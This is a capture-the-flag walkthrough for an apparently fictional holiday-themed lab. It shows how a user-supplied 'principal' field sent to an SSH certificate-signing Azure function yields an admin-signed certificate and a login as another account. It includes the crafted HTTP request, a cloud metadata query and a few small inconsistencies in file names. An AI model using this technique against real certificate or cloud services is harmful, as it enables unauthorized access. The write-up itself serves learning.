# Make SSH key
 ssh-keygen -C 'elf' -f elf
# Request SSH certificate on northpole site
https://northpole-ssh-certs-fa.azurewebsites.net/api/create-cert?code=candy-cane-twirl <br>
Put the contents inside the file ca and change file permissions <br>
echo <ssh_cert value only> > ca.pub <br>
chmod 600 ca.pub

# login to monitor account on server
ssh -i ca.pub -i ~/.ssh/elf monitor@ssh-server-vm.santaworkshopgeeseislands.org  <br>
Press Ctrl C to stop the monitor<br>

Now you should have access to the monitor account

# query vm details
 curl -s -H Metadata:true --noproxy "*" "http://northpole-ssh-certs-fa.azurewebsites.net/metadata/instance?api-version=2021-02-01" | jq

# Look inside ssh configuration files
ls /etc/ssh/auth_principals <br>
cat /etc/ssh/auth_principals/alabaster <br>
Now we know that we need the principal to be admin in order to get access

# I also found the source code here
https://github.com/SantaWorkshopGeeseIslandsDevOps/northpole-ssh-certs-fa/blob/main/function_app.py
<br>
I'm pretty sure you are supposed to get this source code through the Azure API but I could not get it to to work. <br>
We can see here that it's looking for "principal" and "ssh_pub_key" as inputs

# Send request again but add principal in json
You can use curl for this but I just used burpsuite <br>
POST /api/create-cert?code=candy-cane-twirl HTTP/2
Host: northpole-ssh-certs-fa.azurewebsites.net
Content-Length: 596
Sec-Ch-Ua: "Not_A Brand";v="8", "Chromium";v="120"
Sec-Ch-Ua-Platform: "Windows"
Sec-Ch-Ua-Mobile: ?0
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.6099.71 Safari/537.36
Content-Type: application/json
Accept: */*
Origin: https://northpole-ssh-certs-fa.azurewebsites.net
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: cors
Sec-Fetch-Dest: empty
Referer: https://northpole-ssh-certs-fa.azurewebsites.net/api/create-cert?code=candy-cane-twirl
Accept-Encoding: gzip, deflate, br
Accept-Language: en-US,en;q=0.9
Priority: u=1, i

{"ssh_pub_key":"ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDTkStEc7S2N2gv1kMG2LGnbEXkT9vN79df+0PgZ9HCDuePRbu6XXSmmgyTBGPfq2HCh+9qwnGQj6466K9/d+X/4A3zkI7gmHQl/a2SiSB/vxRxajy4ATYrVmyI9B3pCbwPsT6C0wQBJjti7aM9K2YBljDkmc1WljTB5QAaZ455FrouqqyXg+ZLiz1iXnVCUFS2ftQyyB/fkV7l9CACC9xZ66zN5Y5euVqWBoHwQCWY27EbPzudGRke/mhqFNQby7fsexjxF5PEkuBvYHnfL2SFwakd4/qrFfHgJAms/i4fjV5xYxd9xEU+2KhUUsfDye1TwOokGuSmsSMi89Hh88Uoy1+dxSHhTG3tW6f3AxGCcmaaHIAs22tzbCPwI4NvaBbQfrRajai+ahuRSyduncDHY3lw6/F7CFA8KFf2eBEeVjGTFLQk6nEuphEDLKIXqeZZyDA2J6UAmlud/EnGJ6sFmWID2JLj5cHJ8Asg5WuUfr515VfQHvNwpVxPq+ifmMk= elf",
"principal":"admin"}

# copy and paste resulting cert in a new file and ssh
echo <ssh_cert value only> > ca.pub <br>
chmod 600 ca2.pub

ssh -i ca.pub -i ~/.ssh/elf alabaster@ssh-server-vm.santaworkshopgeeseislands.org  <br>

# Look inside the readme and search for cookie
The answer should be within that file